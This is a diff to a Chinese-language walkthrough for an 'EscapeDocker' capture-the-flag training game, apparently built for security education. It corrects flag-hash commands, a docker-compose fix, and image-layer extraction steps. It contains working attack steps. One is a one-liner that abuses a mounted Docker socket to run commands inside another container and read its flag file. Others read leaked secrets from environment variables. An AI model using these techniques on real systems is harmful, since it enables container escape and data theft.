@@ -39,14 +39,15 @@
 `.env` 預設 `FLAG_SEED=escape_docker_dev_seed` 時，在終端機執行：
 
 ```bash
-# 計算單一 FLAG
-echo "escape_docker_dev_seed-room0" | sha256sum | cut -c1-16
+# 計算單一 FLAG（注意：要用 echo -n，否則 echo 預設會多加一個換行字元，
+# 算出來的 hash 會跟後端不一致）
+echo -n "escape_docker_dev_seed-room0" | sha256sum | cut -c1-16
 # 輸出：例如 a3f8c1d2e4b7f9a0
 # 完整 FLAG：EscapeDocker{a3f8c1d2e4b7f9a0}
 
 # 一次計算全部 FLAG
 for room in room0 room1 room2 room3 room4 room5 room6 room7 room8 room9 room10 room11 final secret-a secret-b; do
-  hash=$(echo "escape_docker_dev_seed-${room}" | sha256sum | cut -c1-16)
+  hash=$(echo -n "escape_docker_dev_seed-${room}" | sha256sum | cut -c1-16)
   echo "  ${room}: EscapeDocker{${hash}}"
 done
 ```
@@ -398,56 +399,53 @@ find /tmp/r7-layers -name "*.tar" -exec tar xf {} -C /tmp/content_{} \; 2>/dev/n
 
 **分數：** 200 pts　**難度：** ★★★★☆　**時間：** 5–15 分鐘
 
+> room8 內建一個獨立的 Docker daemon（DinD），`docker compose` 指令是
+> 操作 room8 **自己內部**的 Docker，與 host 無關。
+
 ### 解題步驟
 
 ```bash
-# Step 1：查看破損的 docker-compose.yml
+# Step 1：查看不完整的 docker-compose.yml
 cd /home/player/challenge
 cat docker-compose.yml
 
 # Step 2：嘗試啟動（觀察錯誤）
-docker compose up
+docker compose up -d
 docker compose logs app
-# 錯誤：無法連線到 database / 缺少 DB_HOST
+# 錯誤：ERROR: DB_HOST not set! Fix the docker-compose.yml
 
-# Step 3：修正設定（用 vim 或 echo）
+# Step 3：修正設定（用 vim）
 vim docker-compose.yml
 ```
 
-修正前的問題版本：
+修正前的問題版本（`app` service）：
 ```yaml
-services:
   app:
     image: python:3.11-slim
     environment:
-      - PORT=8080
-    # 缺少：depends_on 和 DB_HOST
-
-  database:
-    image: postgres:15-alpine
-    environment:
-      - POSTGRES_PASSWORD=secret
+      - FLAG_SEED=${FLAG_SEED}
+    # BUG 1: 缺少 depends_on
+    # BUG 2: 缺少必要的環境變數 DB_HOST
+    command: |
+      ...（內嵌的 Python HTTP server，讀取 DB_HOST / FLAG_SEED）
 ```
 
 修正後：
 ```yaml
-services:
   app:
     image: python:3.11-slim
     environment:
-      - PORT=8080
-      - DB_HOST=database          # ← 加這行
       - FLAG_SEED=${FLAG_SEED}
-    depends_on:                   # ← 加這段
+      - DB_HOST=database          # ← 加這行（BUG 2）
+    depends_on:                   # ← 加這段（BUG 1）
       - database
-    ports:
-      - "8080:8080"
-
-  database:
-    image: postgres:15-alpine
-    environment:
-      - POSTGRES_PASSWORD=secret
+    command: |
+      ...
 ```
+
+`FLAG_SEED=${FLAG_SEED}` 已經內建在檔案裡，`docker compose` 會自動讀取
+同目錄的 `.env`（由 room8 啟動時自動產生）做變數替換，不需要玩家額外
+設定。
 
 ```bash
 # Step 4：重新啟動
@@ -455,8 +453,8 @@ docker compose up -d
 
 # Step 5：取得 FLAG
 curl localhost:8080
-# 或
-curl localhost:8080/flag
+# Connected to DB: database
+# FLAG: EscapeDocker{...}
 ```
 
 ---
@@ -631,17 +629,21 @@ EXEC_ID=$(curl -s -X POST \
   "http://localhost/containers/${VAULT_ID}/exec" | python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")
 
 # Step 6：執行並取得 FLAG
+# 注意：/exec/{id}/start 的回應不是純文字，開頭有 8 bytes 的
+# Docker stream multiplexing header（stream type + 4 bytes 長度），
+# 直接印出來在終端機裡是看不到內容的控制字元，要用 `tail -c +9`
+# 跳過這 8 bytes 才能看到實際輸出
 curl -s -X POST \
   --unix-socket /var/run/docker.sock \
   -H "Content-Type: application/json" \
   -d '{"Detach":false,"Tty":false}' \
-  "http://localhost/exec/${EXEC_ID}/start"
+  "http://localhost/exec/${EXEC_ID}/start" | tail -c +9
 ```
 
 ### 完整一行腳本
 
 ```bash
-VAULT_ID=$(curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/json?all=true" | python3 -c "import sys,json;d=json.load(sys.stdin);print([c['Id'] for c in d if 'vault' in c['Names'][0]][0][:12])") && EXEC_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d "{\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/final_flag.txt\"]}" "http://localhost/containers/${VAULT_ID}/exec" | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])") && curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Detach":false,"Tty":false}' "http://localhost/exec/${EXEC_ID}/start"
+VAULT_ID=$(curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/json?all=true" | python3 -c "import sys,json;d=json.load(sys.stdin);print([c['Id'] for c in d if 'vault' in c['Names'][0]][0][:12])") && EXEC_ID=$(curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d "{\"AttachStdout\":true,\"Cmd\":[\"cat\",\"/final_flag.txt\"]}" "http://localhost/containers/${VAULT_ID}/exec" | python3 -c "import sys,json;print(json.load(sys.stdin)['Id'])") && curl -s -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Detach":false,"Tty":false}' "http://localhost/exec/${EXEC_ID}/start" | tail -c +9
 ```
 
 ### 安全教育說明（完成後顯示）
@@ -678,7 +680,9 @@ printenv | grep -i leaked
 
 # Step 3：利用洩漏的 SEED 計算 FLAG
 LEAKED=$(printenv LEAKED_SECRET)
-FLAG_HASH=$(echo "${LEAKED}-secret-a" | sha256sum | cut -c1-16)
+# 注意：要用 echo -n，否則 echo 預設會多加一個換行字元，算出來的 hash
+# 會跟後端不一致，導致 FLAG 被判定錯誤
+FLAG_HASH=$(echo -n "${LEAKED}-secret-a" | sha256sum | cut -c1-16)
 echo "EscapeDocker{${FLAG_HASH}}"
 ```
 
@@ -704,9 +708,17 @@ secret-a:
 
 完成 Room 7 後，在 Dockerfile 或 image history 的提示中發現 `secret-b` 這個 image。
 
+> **注意：以下指令要在 Room 7 的終端機執行**，不是 `secret-b` 自己的
+> 終端機！`secret-b` 容器本身沒有掛載 `/var/run/docker.sock`，無法
+> 操作 Docker；只有 room6/room7/room9/final 這幾個房間掛載了
+> `docker.sock`，可以直接 `docker history` / `docker save` 操作其他
+> image（包含 `escape-docker-secret-b`）。
+
 ### 解題步驟
 
 ```bash
+# 以下指令在 Room 7 的終端機執行
+
 # Step 1：查看 secret-b image 的 build 歷史
 docker history escape-docker-secret-b
 
@@ -723,17 +735,24 @@ mkdir -p /tmp/layers
 tar xf /tmp/secret-b.tar -C /tmp/layers
 
 # Step 4：從所有 layer 裡找 FLAG
-find /tmp/layers -name "*.tar" | while read layer; do
-    tar tf "$layer" 2>/dev/null | grep -i "ghost_layer\|deleted_secret" && \
-    echo "Found in: $layer" && \
-    tar xf "$layer" -O tmp/ghost_layer/deleted_secret.txt 2>/dev/null
-done
+#
+# 注意：新版 docker save 匯出的是 OCI 格式，每個 layer 是
+# /tmp/layers/blobs/sha256/<digest>（檔名是 hash，沒有 .tar 副檔名，
+# 且大多是 gzip 壓縮），不是舊版的 <id>/layer.tar，所以
+# find -name "*.tar" 找不到任何東西！要改成遍歷 blobs/sha256/
+# 底下所有檔案——tar tf / tar xf 會自動偵測 gzip，不用加 -z。
+#
+# 另外，直接 grep -r "EscapeDocker" /tmp/layers/ 會誤中 image 的
+# config（manifest）裡記錄的 Dockerfile RUN 指令原始文字
+# "EscapeDocker{${SECRET}}"——那只是指令字串本身，"${SECRET}" 沒有
+# 被展開，不是真正的 FLAG，不要被它騙了。
 
-# 或更直接：
-grep -r "EscapeDocker" /tmp/layers/ 2>/dev/null
-# 或
-find /tmp/layers -name "*.tar" -exec tar xf {} -C /tmp/extract \; 2>/dev/null
-grep -r "EscapeDocker" /tmp/extract/ 2>/dev/null
+cd /tmp/layers/blobs/sha256
+for f in *; do
+    tar tf "$f" 2>/dev/null | grep -q "ghost_layer\|deleted_secret" && \
+    echo "Found in: $f" && \
+    tar xf "$f" -O tmp/ghost_layer/deleted_secret.txt 2>/dev/null
+done
 ```
 
 ### 設計意義
@@ -762,7 +781,7 @@ docker exec room0 cat /etc/motd | grep EscapeDocker
 
 # 一次確認所有 room 的 FLAG 是否生成
 for i in 0 1 2 3 4 5 6 7 8 9 10 11; do
-  result=$(docker exec room$i bash -c 'FLAG=$(echo "${FLAG_SEED}-room'$i'" | sha256sum | cut -c1-16) && echo "room'$i': EscapeDocker{${FLAG}}"' 2>/dev/null)
+  result=$(docker exec room$i bash -c 'FLAG=$(echo -n "${FLAG_SEED}-room'$i'" | sha256sum | cut -c1-16) && echo "room'$i': EscapeDocker{${FLAG}}"' 2>/dev/null)
   echo "$result"
 done
 ```
